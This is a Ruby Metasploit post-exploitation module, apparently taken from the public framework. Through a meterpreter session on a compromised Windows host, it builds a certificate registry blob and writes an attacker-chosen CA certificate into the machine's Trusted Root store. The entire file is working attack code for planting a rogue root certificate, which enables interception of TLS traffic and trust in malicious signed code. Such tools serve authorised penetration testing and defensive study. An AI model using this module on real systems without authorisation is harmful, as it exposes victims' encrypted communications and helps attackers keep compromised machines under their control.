##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Manage Certificate Authority Injection',
      'Description'   => %q{
        This module allows the attacker to insert an arbitrary CA certificate
        into the victim's Trusted Root store.
      },
      'License'       => BSD_LICENSE,
      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('CAFILE', [ true, 'Path to the certificate you wish to install as a Trusted Root CA.', ''])
      ])
  end

  def run
    certfile = datastore['CAFILE']

    # Check file path
    begin
      ::File.stat(certfile)
    rescue
      print_error("CAFILE not found")
      return
    end

    cert = ''

    # Load the file
    f = ::File.open(certfile, 'rb')
    cert = f.read(f.stat.size)
    f.close

    loadedcert = OpenSSL::X509::Certificate.new(cert)
    certmd5    = Digest::MD5.hexdigest(loadedcert.to_der).scan(/../)
    certsha1   = Digest::SHA1.hexdigest(loadedcert.to_der).scan(/../)
    cskiray    = loadedcert.extensions[0].value.gsub(/:/,'').scan(/../)

    derLength = loadedcert.to_der.length.to_s(16)
    if (derLength.length < 4)
      derLength = "0#{derLength}"
    end

    derRay = derLength.scan(/../)
    hexDerLength = [ derRay[1], derRay[0] ]

    certder = loadedcert.to_der.each_byte.collect {|val| "%02X" % val}

    bblob  = [ "04", "00", "00", "00", "01", "00", "00", "00", "10", "00", "00", "00" ]
    bblob += certmd5
    bblob += [ "03", "00", "00", "00", "01", "00", "00", "00", "14", "00", "00", "00" ]
    bblob += certsha1
    bblob += [ "14", "00", "00", "00", "01", "00", "00", "00", "14", "00", "00", "00" ]
    bblob += cskiray
    bblob += [ "20", "00", "00", "00", "01", "00", "00", "00" ]
    bblob += hexDerLength
    bblob += [ "00", "00" ]
    bblob += certder

    blob = bblob.map(&:hex).pack("C*")

    cleancertsha1 = certsha1.to_s.gsub(/[\s\[\\\"\]]/,'').gsub(/,/,'').upcase
    catree = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\SystemCertificates\\ROOT\\Certificates"
    entire_key = "#{catree}\\#{cleancertsha1}"
    root_key, base_key = client.sys.registry.splitkey(entire_key)

    # Perform the registry operations

    # Ensure the cert doesn't already exist
    begin
      open_key = nil
      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + 0x0000)
      values = open_key.enum_value
      if (values.length > 0)
        print_error("Key already exists!")
        return
      end
    rescue
      open_key = nil
      open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE + 0x0000)
      print_good("Successfully created key: #{entire_key}")

      open_key.set_value('Blob', REG_BINARY, blob)
      print_good("CA inserted!")
    end
  end
end
